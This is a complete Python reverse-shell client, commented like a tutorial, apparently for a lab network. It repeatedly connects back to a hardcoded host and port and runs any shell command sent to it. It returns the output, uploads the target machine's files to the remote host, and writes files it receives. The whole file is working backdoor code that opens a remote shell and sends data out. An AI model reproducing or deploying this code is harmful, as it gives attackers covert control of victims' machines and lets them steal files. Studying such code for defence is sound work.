"""Import socket library to make connection between two different machines over the internet"""
import socket
import time
import json
import subprocess  # Library that will execute commands sent to target
import os

"""Specify CONSTANTS for script"""
HOST_IP = "10.0.2.9"  # Host IP Address to make connection
PORT = 5555  # Port to make connection
REST = 20  # Rest period in seconds to listen out


# Function to send data parameter to target
def reliable_send(data):
	json_data = json.dumps(data)  # Variable of json dumps method of the command issued to the target
	s.send(json_data.encode())  # Encode data prior to sending


# Function to receive data back from target and decode
def reliable_recv():
	data = ""
	while True:
		try:
			# Receive the target data in 1024 bit size chunk, decode it, and strip it the back end
			data += s.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue


# Create a function for connecting back to server
def connection():
	"""This function will scan the network over a period of time to look for the connection"""
	while True:
		time.sleep(REST)
		try:
			s.connect((HOST_IP, PORT))  # Attempt connection to host machine
			shell()
			s.close()  # Close connection when done
			break
		except Exception as ex:
			print(ex)
			connection()


# Function to execute commands from host machine
def shell():
	while True:
		command = reliable_recv()
		"""Adding a quit command"""
		if command == "quit":
			break
		# Create command for "Change Directory"
		elif command[:3] == "cd ":  # Comparing just the first three characters of the command
			os.chdir(command[3:])
		elif command == "clear":
			pass
		elif command[:9] == "download ":
			upload_file(file_name=command[9:])
		elif command[:7] == "upload ":
			download_file(file_name=command[7:])
		else:
			# Create execute object from subprocess library
			execute = subprocess.Popen(
				command,
				shell=True,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				stdin=subprocess.PIPE
			)
			"""Output from the command inputted. The command above encodes the data which will need to be decoded"""
			result = (execute.stdout.read() + execute.stderr.read()).decode()
			reliable_send(result)


# Create a download function
def download_file(file_name):
	with open(file_name, "wb") as f:
		s.settimeout(1)  # Need to set a timeout
		chunk = s.recv(1024)  # Receive chunks of data
		# While target is still receiving data chunks this will be True and will continue to receive data
		while chunk:
			f.write(chunk)
			try:
				chunk = s.recv(1024)
			except socket.timeout as e:
				break
		s.settimeout(None)  # Removes timeout placed above


# Function to read files from the target computer
def upload_file(file_name):
	with open(file_name, "rb") as f:
		s.send(f.read())


"""Initialize a socket object.
AF_INET --> Make a connection over IPV4
SOCK_STREAM --> Use TCP Connection"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()


